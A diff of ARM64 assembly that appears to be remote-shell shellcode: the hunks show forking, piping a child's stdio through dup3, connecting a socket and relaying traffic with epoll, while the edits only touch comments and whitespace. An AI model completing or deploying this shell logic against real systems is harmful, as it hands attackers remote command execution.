@@ -99,8 +99,8 @@ _start:
     movk    x0, 0x120, lsl #16   //
     svc     0
     str     w0, [sp, #id]        // save id
-    cbnz    w0, opn_con          // already forked?
-
+    cbnz    w0, opn_con          // if already forked?
+                                 // open connection
     // in this order..
     //
     // dup3 (out[1], STDERR_FILENO, 0);
@@ -117,7 +117,7 @@ c_dup:
     csel    w0, w3, w4, eq
     svc     0
     cbnz    x1, c_dup
-
+    
     // close pipe handles in this order..
     //
     // close(in[0]);
@@ -183,7 +183,7 @@ opn_con:
     // connect (s, &sa, sizeof(sa));
     mov     x8, #SYS_connect
     svc     0
-    cbnz    x0, cls_sck        // if(x0 != 0) goto cls_sck
+    cbnz    x0, cls_sck      // if(x0 != 0) goto cls_sck
 .endif
     // efd = epoll_create1(0);
     mov     x8, #SYS_epoll_create1
@@ -227,8 +227,10 @@ poll_wait:
     ldp     w5, w4, [sp, #in1] 
 
     cmp     w1, w3
+    
     // r = (fd == s) ? s : out[0];
     csel    w0, w3, w4, eq
+    
     // w = (fd == s) ? in[1] : s;
     csel    w3, w5, w3, eq
 
